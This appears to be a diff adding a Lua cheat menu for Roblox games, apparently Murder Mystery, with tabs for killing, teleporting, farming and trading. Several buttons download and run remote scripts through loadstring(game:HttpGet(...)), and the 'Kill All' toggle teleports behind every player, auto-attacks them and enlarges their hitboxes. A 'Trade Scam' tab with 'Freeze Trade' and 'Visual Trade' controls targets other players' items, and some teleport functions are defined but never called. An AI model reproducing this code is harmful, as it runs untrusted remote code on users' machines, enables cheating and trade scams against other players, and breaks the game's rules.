+		loadstring(game:HttpGet("https://raw.githubusercontent.com/radjahfromdiscord/iNEXT/main/source"))()
+      		print("Loaded")
+  	end    
+})
+
+local MR = Window:MakeTab({
+	Name = "My Restaurant",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+MR:AddButton({
+	Name = "Op Auto Farm",
+	Callback = function()
+		loadstring(game:HttpGet("https://rawscripts.net/raw/My-Restaurant!-Fast-Autofarm-4610"))()
+      		print("Loaded")
+  	end    
+})
+
+
+local BB = Window:MakeTab({
+	Name = "Booga Booga",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+BB:AddButton({
+	Name = "Op Auto Kill And Farm",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/WarriorCrystal/WarriorHub/main/Load.lua"))()
+      		print("Loaded")
+  	end    
+})
+    end
+})
+EspTab:Toggle({
+    Title = "Gun Esp (PATCHED)",
+    Value = false,
+    Callback = function(state)
+        print("Names:", state)
+    end
+})
+-- =========================
+-- INNOCENT TAB
+-- =========================
+
+InnocentTab:Paragraph({
+    Title = "Innocent Tools",
+    Desc = "Features for innocent role.",
+})
+
+
+InnocentTab:Button({
+    Title = "Xp Farm",
+    Callback = function()
+       local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Target teleport CFrame
+local targetCFrame = CFrame.new(-135.05, -8.00, -25.10)
+
+-- Teleport, freeze, and create a bigger subtle box
+local function teleportFreezeBox(Char)
+    local Root = Char:WaitForChild("HumanoidRootPart")
+
+    -- Create subtle box if it doesn't exist
+    local box = workspace:FindFirstChild("LocalBox_"..LocalPlayer.Name)
+    if not box then
+        box = Instance.new("Part")
+        box.Name = "LocalBox_"..LocalPlayer.Name
+        box.Size = Vector3.new(6, 8, 6)  -- bigger size (width, height, depth)
+        box.Anchored = true
+        box.CanCollide = false
+        box.Material = Enum.Material.Plastic
+        box.Color = Color3.fromRGB(255, 255, 255)
+        box.Transparency = 0.5  -- semi-transparent
+        box.Parent = workspace
+    end
+
+    -- Loop to keep teleporting, freezing, and updating box
+    task.spawn(function()
+        while Char.Parent do
+            Root.CFrame = targetCFrame
+            Root.Anchored = true
+            box.CFrame = Root.CFrame  -- box follows player exactly
+            task.wait(0.1)
+        end
+    end)
+end
+
+-- Apply to current character
+if LocalPlayer.Character then
+    teleportFreezeBox(LocalPlayer.Character)
+end
+
+-- Re-apply on respawn
+LocalPlayer.CharacterAdded:Connect(function(Char)
+    task.wait(0.1)
+    teleportFreezeBox(Char)
+end)
+
+    end
+})
+
+-- =========================
+-- MURDERER TAB
+-- =========================
+
+MurdererTab:Toggle({
+    Title = "Kill All",
+    Value = false,
+    Callback = function(state)
+        --// Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+local MAX_DISTANCE = 200
+local TELEPORT_OFFSET = 0.3 -- now extremely close behind the target
+local ATTACK_COOLDOWN = 0.2 -- cooldown fixed to 0.2 seconds
+
+local AIM_UP_OFFSET = Vector3.new(0, 1.5, 0) -- camera aims slightly upward
+
+local running = false
+local lockOnEnabled = false
+
+--// AUTO ATTACK FUNCTION
+local function autoAttack()
+local char = LocalPlayer.Character
+if not char then return end
+local tool = char:FindFirstChildWhichIsA("Tool")
+if tool and tool:FindFirstChild("Activate") then
+tool:Activate()
+end
+end
+
+--// LOCK-ON FUNCTIONS
+local function getClosestPlayer()
+local closest = nil
+local shortestDistance = math.huge
+local myChar = LocalPlayer.Character
+if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
+local myHRP = myChar.HumanoidRootPart
+
+for _, player in ipairs(Players:GetPlayers()) do
+if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+local targetHRP = player.Character.HumanoidRootPart
+local distance = (targetHRP.Position - myHRP.Position).Magnitude
+if distance < shortestDistance and distance <= MAX_DISTANCE then
+closest = player
+shortestDistance = distance
+end
+end
+end
+return closest
+end
+
+local function getBackPosition(character)
+local hrp = character:FindFirstChild("HumanoidRootPart")
+if not hrp then return nil end
+return hrp.Position - hrp.CFrame.LookVector * TELEPORT_OFFSET
+end
+
+--// AUTO TELEPORT + ATTACK LOOP
+task.spawn(function()
+while true do
+if running then
+local character = LocalPlayer.Character
+if character and character:FindFirstChild("HumanoidRootPart") then
+local root = character.HumanoidRootPart
+for _, other in ipairs(Players:GetPlayers()) do
+if other ~= LocalPlayer and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
+local targetRoot = other.Character.HumanoidRootPart
+
+-- teleport VERY close behind target (0.3 studs)
+root.CFrame = targetRoot.CFrame * CFrame.new(0, 0, TELEPORT_OFFSET)
+
+-- aim camera slightly higher
+Camera.CFrame = CFrame.new(
+Camera.CFrame.Position,
+targetRoot.Position + AIM_UP_OFFSET
+)
+
+autoAttack()
+task.wait(ATTACK_COOLDOWN)
+end
+end
+end
+end
+task.wait(0.1)
+end
+end)
+
+--// AUTO LOCK-ON CAMERA
+RunService.RenderStepped:Connect(function()
+if lockOnEnabled then
+local target = getClosestPlayer()
+if target and target.Character then
+local targetRoot = target.Character.HumanoidRootPart
+
+-- camera now aims slightly above the target
+Camera.CFrame = CFrame.new(
+Camera.CFrame.Position,
+targetRoot.Position + AIM_UP_OFFSET
+)
+end
+end
+end)
+
+--// HITBOX EXPANDER
+local function expandHitboxes()
+local players = Players
+local plr = LocalPlayer
+
+task.spawn(function()
+while true do
+task.wait(1)
+for _, v in pairs(players:GetPlayers()) do
+if v ~= plr and v.Character then
+local char = v.Character
+if char:FindFirstChild("RightUpperLeg") then
+char.RightUpperLeg.CanCollide = false
+char.RightUpperLeg.Transparency = 10
+char.RightUpperLeg.Size = Vector3.new(13,13,13)
+end
+if char:FindFirstChild("LeftUpperLeg") then
+char.LeftUpperLeg.CanCollide = false
+char.LeftUpperLeg.Transparency = 10
+char.LeftUpperLeg.Size = Vector3.new(13,13,13)
+end
+if char:FindFirstChild("HeadHB") then
+char.HeadHB.CanCollide = false
+char.HeadHB.Transparency = 10
+char.HeadHB.Size = Vector3.new(13,13,13)
+end
+if char:FindFirstChild("HumanoidRootPart") then
+char.HumanoidRootPart.CanCollide = false
+char.HumanoidRootPart.Transparency = 10
+char.HumanoidRootPart.Size = Vector3.new(13,13,13)
+end
+end
+end
+end
+end)
+end
+
+--// START FEATURES AUTOMATICALLY
+running = true
+lockOnEnabled = true
+expandHitboxes()
+    end
+})
+-- =========================
+-- MURDERER TAB (FUNCTIONAL)
+-- =========================
+MurdererTab:Toggle({
+    Title = "Auto - Equip Knife",
+    Description = "Automatically equips the knife when you are the Murderer.",
+    Value = false,
+    Callback = function(state)
+        -- Store the connection in the env table to persist
+        env.equipKnifeConnection = state and game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+            -- This function will run every time the player respawns
+            if env.isEquipKnifeEnabled then -- Check if the toggle is still on
+                local backpack = game.Players.LocalPlayer:FindFirstChild("Backpack")
+                local knife = backpack and backpack:FindFirstChild("Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Knife")
+                if knife then
+                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(knife)
+                end
+            end
+        end) or nil
+
+        -- Store the toggle's state in the env table
+        env.isEquipKnifeEnabled = state
+
+        if state then
+            -- Function to find and equip the knife
+            local function equipTheKnife()
+                local player = game.Players.LocalPlayer
+                local character = player.Character
+                if not character then return end
+
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if not humanoid then return end
+
+                local backpack = player:FindFirstChild("Backpack")
+                if not backpack then return end
+
+                local knife = backpack:FindFirstChild("Knife") or character:FindFirstChild("Knife")
+                if knife then
+                    humanoid:EquipTool(knife)
+                end
+            end
+
+            -- Initial attempt to equip the knife
+            equipTheKnife()
+
+            -- Also check periodically in case the knife is given late
+            env.equipKnifeLoop = task.spawn(function()
+                while env.isEquipKnifeEnabled do
+                    equipTheKnife()
+                    task.wait(1) -- Check every second
+                end
+            end)
+
+        else
+            -- If the toggle is turned off, stop the loop
+            if env.equipKnifeLoop then
+                task.cancel(env.equipKnifeLoop)
+                env.equipKnifeLoop = nil
+            end
+        end
+    end
+})
+-- =========================
+-- SHERIFF TAB
+-- =========================
+
+SheriffTab:Toggle({
+    Title = "Shoot Murderer BLATANT (COMING SOON)",
+    Value = false,
+    Callback = function(state)
+        print("Auto Shoot:", state)
+    end
+})
+
+SheriffTab:Toggle({
+    Title = "Auto-Shoot Murderer (COMING SOON)",
+    Value = false,
+    Callback = function(state)
+        print("Auto Shoot:", state)
+    end
+})
+
+SheriffTab:Toggle({
+    Title = "Wallbang (PATCHED)",
+    Value = false,
+    Callback = function(state)
+        print("Auto Shoot:", state)
+    end
+})
+-- =========================
+-- TELEPORT TAB
+-- =========================
+
+TeleportTab:Button({
+    Title = "Teleport to Lobby",
+    Callback = function()
+        -- Teleport To Lobby
+local function TeleportToLobby()
+    local lobby = Workspace:FindFirstChild("Lobby", true)
+    if lobby and lobby.Parent then
+        local part = lobby:FindFirstChildWhichIsA("BasePart", true)
+        local parts = lobby.Parent:FindFirstChildWhichIsA("BasePart", true)
+
+        if Char and part and part.CFrame then
+            Char:PivotTo(part.CFrame * CFrame.new(0, 2, 0))
+        elseif Char and parts and parts.CFrame then
+            Char:PivotTo(parts.CFrame * CFrame.new(0, 2, 0))
+        elseif Root and part and part.CFrame then
+            Root.CFrame = part.CFrame * CFrame.new(0, 2, 0)
+        elseif Root and parts and parts.CFrame then
+            Root.CFrame = parts.CFrame * CFrame.new(0, 2, 0)
+        end
+    end
+end
+
+    end
+})
+TeleportTab:Button({
+    Title = "Teleport to Map",
+    Callback = function()
+        -- Teleport To Map
+local function TeleportToMap()
+    local map = Workspace:FindFirstChild("CoinContainer", true)
+    if map and map.Parent then
+        local part = map:FindFirstChildWhichIsA("BasePart", true)
+        local parts = map.Parent:FindFirstChildWhichIsA("BasePart", true)
+
+        if Char and part and part.CFrame then
+            Char:PivotTo(part.CFrame * CFrame.new(0, 2, 0))
+        elseif Char and parts and parts.CFrame then
+            Char:PivotTo(parts.CFrame * CFrame.new(0, 2, 0))
+        elseif Root and part and part.CFrame then
+            Root.CFrame = part.CFrame * CFrame.new(0, 2, 0)
+        elseif Root and parts and parts.CFrame then
+            Root.CFrame = parts.CFrame * CFrame.new(0, 2, 0)
+        end
+    end
+end
+
+    end
+})
+TeleportTab:Button({
+    Title = "Teleport to Sheriff",
+    Callback = function()
+       -- Teleport to Sheriff
+local function TeleportToSheriff()
+    local targetPlayer = nil
+
+    -- Find the Sheriff
+    for plr, role in pairs(getRoles()) do
+        if role == "Sheriff" then
+            targetPlayer = Players:FindFirstChild(plr)
+            break
+        end
+    end
+
+    if targetPlayer and targetPlayer.Character then
+        local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            -- Teleport local player
+            if Char and Char.PrimaryPart then
+                Char:PivotTo(hrp.CFrame * CFrame.new(0, 2, 0))
+            elseif Root then
+                Root.CFrame = hrp.CFrame * CFrame.new(0, 2, 0)
+            end
+        end
+    end
+end
+
+    end
+})
+TeleportTab:Button({
+    Title = "Teleport to Murderer",
+    Callback = function()
+        -- Teleport To Murderer
+local function TeleportToMurderer()
+    local targetPlayer = nil
+
+    -- Find the Murderer
+    for plr, role in pairs(getRoles()) do
+        if role == "Murderer" then
+            targetPlayer = Players:FindFirstChild(plr)
+            break
+        end
+    end
+
+    if targetPlayer and targetPlayer ~= LocalPlayer and targetPlayer.Character then
+        local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            if Char and Char.PrimaryPart then
+                Char:PivotTo(hrp.CFrame * CFrame.new(0, 2, 0))
+            elseif Root then
+                Root.CFrame = hrp.CFrame * CFrame.new(0, 2, 0)
+            end
+        end
+    end
+end
+
+    end
+})
+
+-- =========================
+-- INFO / MISC TAB
+-- =========================
+MiscTab:Paragraph({
+    Title = "WE ARE NOT RESPONSIBLE FOR ANY BANS",
+    Desc = "NOTICE",
+})
+MiscTab:Paragraph({
+    Title = "Script Info",
+    Desc = "Version 1.0\nMade using WindUI",
+})
+
+MiscTab:Button({
+    Title = "Copy Discord (No Discord For Now)",
+    Callback = function()
+        print("Copied Discord")
+    end
+})
+
+MiscTab:Paragraph({
+    Title = "Script Made By Cruelzzss",
+    Desc = "Creator Of Script",
+})
+
+MiscTab:Paragraph({
+    Title = "Big Thanks To THEECH0SENON3",
+    Desc = "Co-Owner Of Script",
+})
+
+MiscTab:Paragraph({
+    Title = "THIS SCRIPT IS IN BETA ",
+    Desc = "EXPECT GLITCHES",
+})
+-- =========================
+-- TRADE SCAM TAB
+-- =========================
+local TradeScamTab = Section:Tab({ Title = "Trade", Icon = "diamond" })
+
+TradeScamTab:Paragraph({ Title = "Trading Hub", Desc = "Manage your trades and offers here.", })
+
+TradeScamTab:Section({ Title = "Trade Settings" })
+
+TradeScamTab:Toggle({
+    Title = "Auto-Accept Trades",
+    Description = "Automatically accepts incoming trade requests.",
+    Value = false,
+    Callback = function(state)
+        print("Auto-Accept Trades is now:", state and "ON" or "OFF")
+        -- Placeholder: Logic to monitor and accept trades would go here.
+    end
+})
+
+TradeScamTab:Toggle({
+    Title = "Trade Notifier",
+    Description = "Shows a notification when someone sends a trade request.",
+    Value = true,
+    Callback = function(state)
+        print("Trade Notifier is now:", state and "ON" or "OFF")
+        -- Placeholder: Logic to detect trade requests would go here.
+    end
+})
+
+TradeScamTab:Section({ Title = "Offer Management" })
+
+TradeScamTab:Dropdown({
+    Title = "Scanning Mode",
+    Description = "Select how to evaluate trade offers.",
+    Values = { "Value Check", "Item Check", "Rarity Check" },
+    Default = "Value Check",
+    Callback = function(value)
+        print("Scanning Mode set to:", value)
+        -- Placeholder: Logic to change the scanning method would go here.
+    end
+})
+
+TradeScamTab:Slider({
+    Title = "Minimum Offer Value",
+    Description = "Only accept trades with items above this value.",
+    Value = { Min = 0, Max = 100000, Default = 1000 },
+    Callback = function(value)
+        print("Minimum Offer Value set to:", value)
+        -- Placeholder: Logic to update the value threshold would go here.
+    end
+})
+
+TradeScamTab:Section({ Title = "Actions" })
+
+TradeScamTab:Button({
+    Title = "Request Trade From Player",
+    Description = "Opens a trade with the nearest player.",
+    Callback = function()
+        print("Requesting trade from nearest player...")
+        -- Placeholder: Logic to find and send a trade request would go here.
+    end
+})
+
+TradeScamTab:Button({
+    Title = "Decline All Pending Trades",
+    Description = "Cancels all outgoing trade requests.",
+    Callback = function()
+        print("Declining all pending trades...")
+        -- Placeholder: Logic to cancel all trades would go here.
+    end
+})
+
+TradeScamTab:Paragraph({ Title = "Disclaimer", Desc = "Use trade features at your own risk. We are not responsible for lost items.", })-- =========================
+-- TRADE SCAM TAB (continued)
+-- =========================
+-- (Paste this code inside the TradeScamTab definition)
+
+TradeScamTab:Section({ Title = "Trade Control" })
+
+TradeScamTab:Toggle({
+    Title = "Freeze Trade",
+    Description = "Temporarily locks the trade window from changes.",
+    Value = false,
+    Callback = function(state)
+        print("Freeze Trade is now:", state and "ON" or "OFF")
+        -- Placeholder: Logic to lock/unlock the trade UI would go here.
+    end
+})
+
+TradeScamTab:Toggle({
+    Title = "Toggle Visual Trade",
+    Description = "Enables or disables the visual trade overlay.",
+    Value = false,
+    Callback = function(state)
+        print("Visual Trade overlay is now:", state and "VISIBLE" or "HIDDEN")
+        -- Placeholder: Logic to create/remove a visual GUI would go here.
+    end
+})
+
+TradeScamTab:Button({
+    Title = "Visual Trade",
+    Description = "Opens the visual trade interface.",
+    Callback = function()
+        print("Opening Visual Trade window...")
+        -- Placeholder: Logic to open a custom trade window would go here.
+    end
+})
+MainTab:Toggle({
+    Title = "Anti-AFK",
+    Description = "Prevents you from getting kicked for idling.",
+    Value = false,
+    Callback = function(state)
+        local VirtualUser = game:GetService("VirtualUser")
+        local Player = game:GetService("Players").LocalPlayer
+        
+        if state then
+            Player.Idled:Connect(function()
+                VirtualUser:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+                task.wait(1)
+                VirtualUser:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+            end)
+        end
+    end
+})
